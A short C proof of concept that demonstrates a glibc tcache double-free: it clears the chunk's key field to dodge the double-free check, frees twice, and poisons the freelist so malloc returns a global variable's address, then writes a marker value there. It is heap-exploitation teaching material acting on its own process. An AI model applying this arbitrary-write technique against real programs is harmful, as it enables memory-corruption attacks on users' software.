// gcc -o tcache_dfb_poc tcache_dfb_poc.c
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
uint64_t target;
int main()
{
	uint64_t *ptr = malloc(0x20);
	uint64_t *ptr2;
	free(ptr);
	ptr[1] = 0x0;
	free(ptr);
	ptr[0] = (uint64_t)&target; 
	malloc(0x20);
	ptr2 = malloc(0x20);
	ptr2[0] = 0x41414141;
	printf("target : 0x%lx\n", target);
}